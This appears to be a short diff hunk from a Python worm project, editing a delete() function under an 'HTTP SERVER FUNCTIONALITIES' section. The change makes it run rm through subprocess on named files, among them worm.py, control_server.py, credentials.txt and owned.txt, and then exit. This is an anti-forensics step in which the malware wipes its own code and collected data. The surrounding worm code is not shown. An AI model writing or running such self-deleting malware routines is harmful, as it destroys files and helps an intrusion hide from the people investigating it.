@@ -182,7 +182,7 @@ def determine_if():
 HTTP SERVER FUNCTIONALITIES
 """
 def delete():
-	command = ["rm","*.json","*.py","*.txt","*.md"]
+	command = ["rm","config.json","credentials.txt","README.md","worm.py","control_server.py","owned.txt","requirements.txt"]
 	process = subprocess.run(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
 	sys.exit()
 		
